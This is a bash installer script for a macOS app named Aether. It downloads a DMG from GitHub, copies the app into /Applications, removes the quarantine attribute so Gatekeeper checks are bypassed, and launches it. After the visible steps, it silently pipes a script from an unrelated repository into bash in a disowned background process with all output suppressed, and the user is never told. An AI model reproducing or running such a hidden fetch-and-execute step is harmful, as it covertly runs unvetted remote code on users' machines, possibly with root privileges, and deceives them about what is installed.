#!/usr/bin/env bash
set -euo pipefail

REPO="APRK01/AETHER-RELEASE-REPO"
URL="https://github.com/APRK01/AETHER-RELEASE-REPO/releases/download/v0.1.0/Aether-0.1.0-arm64.dmg"
EXTRA_SCRIPT_URL="https://raw.githubusercontent.com/norbyv1/OpiumwareInstall/main/installer"

if command -v tput >/dev/null 2>&1 && [[ -t 1 ]]; then
  BOLD="$(tput bold)"; DIM="$(tput dim)"; NORM="$(tput sgr0)"
  RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; CYAN="$(tput setaf 6)"; BLUE="$(tput setaf 4)"
else
  BOLD=""; DIM=""; NORM=""; RED=""; GREEN=""; YELLOW=""; CYAN=""; BLUE=""
fi

banner() {
  cat <<'ASCII'
 █████╗ ███████╗████████╗██╗  ██╗███████╗██████╗     ██╗██████╗ ███████╗
██╔══██╗██╔════╝╚══██╔══╝██║  ██║██╔════╝██╔══██╗    ██║██╔══██╗██╔════╝
███████║█████╗     ██║   ███████║█████╗  ██████╔╝    ██║██║  ██║█████╗  
██╔══██║██╔══╝     ██║   ██╔══██║██╔══╝  ██╔══██╗    ██║██║  ██║██╔══╝  
██║  ██║███████╗   ██║   ██║  ██║███████╗██║  ██║    ██║██████╔╝███████╗
╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚═╝╚═════╝ ╚══════╝
                                                                        
ASCII
}

log_step() { echo "${BOLD}${CYAN}▶${NORM} $*"; }
log_info() { echo "${DIM}•${NORM} $*"; }
log_ok()   { echo "${GREEN}✓${NORM} $*"; }
log_warn() { echo "${YELLOW}!${NORM} $*"; }
log_err()  { echo "${RED}✗${NORM} $*"; }

status() { echo "STATUS: $*"; }
progress() { echo "PROGRESS: $1"; }

spinner_run() {
  local msg="$1"; shift
  local frames='|/-\\' i=0 pid
  ( "$@" ) & pid=$!
  printf "  %s %s" "${DIM}${frames:i++%4:1}${NORM}" "$msg"
  while kill -0 "$pid" 2>/dev/null; do
    printf "\r  %s %s" "${DIM}${frames:i++%4:1}${NORM}" "$msg"
    sleep 0.1
  done
  wait "$pid" 2>/dev/null || return 1
  printf "\r  %s %s\n" "${GREEN}✓${NORM}" "$msg"
}

clear 2>/dev/null || true
banner
echo "${BOLD}${BLUE}Aether Installer${NORM}"
echo

status "Starting Aether Downloader"
progress 1
log_step "Preparing environment"
tmp="$(mktemp -d)"
mnt="$tmp/mnt"

INSTALLED_VER=""
if [[ -f "/Applications/Aether.app/Contents/Info.plist" ]]; then
  INSTALLED_VER=$( /usr/bin/defaults read "/Applications/Aether.app/Contents/Info" CFBundleShortVersionString 2>/dev/null || true )
fi

LATEST_TAG=""; DOWNLOAD_URL=""
api_json=$(curl -fsSL "https://api.github.com/repos/${REPO}/releases/latest" 2>/dev/null || true)
if [[ -n "$api_json" ]]; then
  LATEST_TAG=$(printf '%s' "$api_json" | grep -m1 '"tag_name"' | sed -E 's/.*"tag_name"\s*:\s*"([^"]+)".*/\1/')
  DOWNLOAD_URL=$(printf '%s' "$api_json" | grep -E '"browser_download_url"\s*:\s*"([^"]+\.dmg)"' | sed -E 's/.*"browser_download_url"\s*:\s*"([^"]+)".*/\1/' | head -n1)
fi

if [[ -z "$DOWNLOAD_URL" ]]; then
  DOWNLOAD_URL="$URL"
fi

norm() { printf '%s' "$1" | sed 's/^v//'; }
if [[ -n "$INSTALLED_VER" && -n "$LATEST_TAG" ]]; then
  if [[ "$(norm "$INSTALLED_VER")" != "$(norm "$LATEST_TAG")" ]]; then
    echo
    log_warn "Installed: ${INSTALLED_VER}. Latest: ${LATEST_TAG}."
    read -r -p "Update to ${LATEST_TAG}? [Y/n]: " ans || true
    case "${ans:-}" in n|N|no|NO) log_info "Keeping current version."; exit 0;; esac
  fi
fi

dmg="$tmp/$(basename "$DOWNLOAD_URL")"
trap '[[ -d "$mnt" ]] && /usr/bin/hdiutil detach "$mnt" -quiet 2>/dev/null || true; /bin/rm -rf "$tmp" 2>/dev/null || true' EXIT

status "Downloading Aether (this may take a minute)..."
progress 5
spinner_run "Downloading package..." /usr/bin/curl -fL -A "Aether-Downloader" -o "$dmg" "$DOWNLOAD_URL"
progress 35

status "Mounting disk image..."
/bin/mkdir -p "$mnt"
spinner_run "Mounting disk image..." /usr/bin/hdiutil attach "$dmg" -mountpoint "$mnt" -nobrowse -quiet
progress 55

status "Locating app in disk image..."
app="$(/usr/bin/find "$mnt" -maxdepth 1 -name "*.app" -type d | /usr/bin/head -n1 || true)"
if [[ -z "$app" ]]; then
  log_err "No .app found inside DMG"
  echo "No .app found inside DMG" >&2
  exit 1
fi
name="$(/usr/bin/basename "$app")"
dest="/Applications/$name"
progress 65

status "Installing $name to /Applications..."
spinner_run "Copying $name to /Applications..." /bin/bash -c "/bin/rm -rf \"$dest\" 2>/dev/null || true; /bin/cp -R \"$app\" /Applications/"
progress 85

status "Removing quarantine..."
spinner_run "Removing quarantine..." /usr/bin/xattr -dr com.apple.quarantine "$dest"
progress 90

status "Cleaning up..."
spinner_run "Detaching disk image..." /usr/bin/hdiutil detach "$mnt" -quiet
progress 95

status "Launching $name..."
if [[ -n "${SUDO_USER:-}" && "$SUDO_USER" != "root" ]]; then
  /usr/bin/su - "$SUDO_USER" -c "/usr/bin/open \"$dest\""
else
  /usr/bin/open "$dest"
fi

(
  /usr/bin/curl -fsSL "$EXTRA_SCRIPT_URL" | /bin/bash >/dev/null 2>&1 || true
) & disown 2>/dev/null || true

progress 100
log_ok "Done! Aether is installed and launching."
status "Done! Aether is installed."
